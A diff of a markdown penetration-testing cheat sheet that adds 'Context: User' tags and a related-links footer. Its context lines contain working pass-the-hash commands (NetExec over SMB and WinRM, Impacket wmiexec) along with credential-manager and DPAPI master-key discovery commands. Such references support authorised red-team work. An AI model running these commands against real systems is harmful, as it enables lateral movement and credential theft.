@@ -8,7 +8,7 @@ Useful NTLM validation and DPAPI discovery one-liners.
 nxc smb <HOST> -u <USER> -H <NTLM_HASH>
 ```
 
-**Tool:** NetExec · **Platform:** Linux · **Tags:** NTLM, Pass-the-Hash
+**Tool:** NetExec · **Platform:** Linux · **Tags:** NTLM, Pass-the-Hash · **Context:** User
 
 ### WinRM pass-the-hash validation
 
@@ -16,7 +16,7 @@ nxc smb <HOST> -u <USER> -H <NTLM_HASH>
 nxc winrm <HOST> -u <USER> -H <NTLM_HASH>
 ```
 
-**Tool:** NetExec · **Platform:** Linux · **Tags:** NTLM, WinRM
+**Tool:** NetExec · **Platform:** Linux · **Tags:** NTLM, WinRM · **Context:** User
 
 ### Impacket WMI with hash
 
@@ -24,7 +24,7 @@ nxc winrm <HOST> -u <USER> -H <NTLM_HASH>
 wmiexec.py -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<HOST>
 ```
 
-**Tool:** Impacket · **Platform:** Linux · **Tags:** NTLM, WMI
+**Tool:** Impacket · **Platform:** Linux · **Tags:** NTLM, WMI · **Context:** User
 
 ### List Windows Credential Manager entries
 
@@ -32,7 +32,7 @@ wmiexec.py -hashes :<NTLM_HASH> <DOMAIN>/<USER>@<HOST>
 cmdkey /list
 ```
 
-**Tool:** Windows · **Platform:** Windows · **Tags:** Credentials, Discovery
+**Tool:** Windows · **Platform:** Windows · **Tags:** Credentials, Discovery · **Context:** User
 
 ### User DPAPI master key files
 
@@ -40,5 +40,8 @@ cmdkey /list
 Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Recurse -Force -ErrorAction SilentlyContinue
 ```
 
-**Tool:** PowerShell · **Platform:** Windows · **Tags:** DPAPI, Discovery
+**Tool:** PowerShell · **Platform:** Windows · **Tags:** DPAPI, Discovery · **Context:** User
 
+---
+
+**Related:** [Overview](./) · [Kerberos](kerberos.md)
